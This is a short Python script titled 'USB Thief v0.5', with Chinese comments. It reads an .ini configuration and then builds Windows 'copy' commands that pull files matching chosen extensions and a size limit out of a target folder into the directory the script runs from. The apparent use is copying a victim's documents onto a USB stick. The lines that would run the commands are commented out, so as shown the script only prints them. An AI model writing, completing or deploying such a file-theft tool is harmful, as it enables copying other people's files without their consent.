# USB Thief v0.5
#.ini 配置文件：
# [0]目标文件夹地址 
# [1]单次复制文件的最大值(GB) 1GB = 1048576kb
# [2]if 执行的操作
# [3](2,3)操作下的所需的文件后缀


import os
from Get_FilesAndDoc import Get_FilesPath,Get_AllFiles
from Check_ini import CheckPath


LocalPath = os.getcwd()

# 获取本脚本的运行路径并指定为配置文件以及复制文件的保存路径

Setting,TargetEnd = CheckPath()
CopyPath = Setting[0]
Mix_GB = int(Setting[1]) * 104857
Copy_Choice = 1 #int(Setting[2])

if Copy_Choice == 1:

    FilesPath = Get_FilesPath(CopyPath,Mix_GB)

    for SingleFile in FilesPath:
        Command = 'copy ' + SingleFile + ' ' + LocalPath
        print(Command)
#        try:           
#            os.system(Command)
#        except:
#            continue
elif Copy_Choice == 2:

    FilesPath = Get_FilesPath(CopyPath,Mix_GB)
    
    for SingleFile in FilesPath:

        FilesPath_listed = list(SingleFile)
        SingleLet = FilesPath_listed.index(".")
        FilesNameLength = SingleLet + 1
        FilesEnd = ""

        for x in range(0,len(FilesPath_listed) - FilesNameLength):
            FilesEnd = FilesEnd + FilesPath_listed[FilesNameLength]
            FilesNameLength = FilesNameLength + 1
        # 提取读取文件的后缀名并用FilesEnd接受
        for y in TargetEnd:

            if FilesEnd == y:
                Command = 'copy ' + SingleFile + ' ' + LocalPath
                print(Command)
#                try:   
#                    os.system(Command)
#                except:
#                    continue
        # 通过判断后缀格式筛选索要复制的文件

elif Copy_Choice == 3:

    FilesPath = Get_AllFiles(CopyPath,Mix_GB)
                             
    for SingleFile in FilesPath:

        FilesPath_listed = list(SingleFile)
        SingleLet = FilesPath_listed.index(".")
        FilesNameLength = SingleLet + 1
        FilesEnd = ""

        for x in range(0,len(FilesPath_listed) - FilesNameLength):
            FilesEnd = FilesEnd + FilesPath_listed[FilesNameLength]
            FilesNameLength = FilesNameLength + 1
        # 提取读取文件的后缀名并用FilesEnd接受
        for y in TargetEnd:

            if FilesEnd == y:
                Command = 'copy ' + CopyPath + '\\' + SingleFile + ' ' + LocalPath
                print(Command)
#                try:
#                    os.system(Command)
#                except:
#                    continue
        # 通过判断后缀格式筛选索要复制的文件
# cmd 的 copy 命令 copy 文件路径 目标路径